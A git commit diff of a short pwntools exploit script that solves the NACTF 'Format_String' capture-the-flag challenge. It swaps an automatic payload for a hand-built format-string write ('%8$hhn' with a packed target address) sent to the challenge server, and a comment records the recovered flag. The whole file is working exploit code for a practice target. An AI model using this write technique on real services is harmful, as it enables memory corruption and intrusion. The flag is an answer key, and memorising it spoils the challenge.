e199a29bc1173ce4f314d034ca3edec811c3b5f5
Th3F0x-code <alessio.ciccola@gmail.com>
2020-11-09 12:12:45 +0100

    solution

--- NACTF/Format_String/exp.py
+++ NACTF/Format_String/exp.py
@@ -1,7 +1,10 @@
 from pwn import *
 
-elf = ELF("format")
-r = remote("challenges.ctfd.io", 30266)
-vuln = {0x404080: 48}
-r.sendline(fmtstr_payload(6, vuln))
-r.interactive()
+
+p = ELF('./format')
+p = remote('challenges.ctfd.io', 30266)
+p.recvuntil('.\n')
+p.sendline("%60x      %8$hhn{}".format(p64(0x404080)))
+p.interactive()
+
+#FLAG --> nactf{d0nt_pr1ntf_u54r_1nput_HoUaRUxuGq2lVSHM}
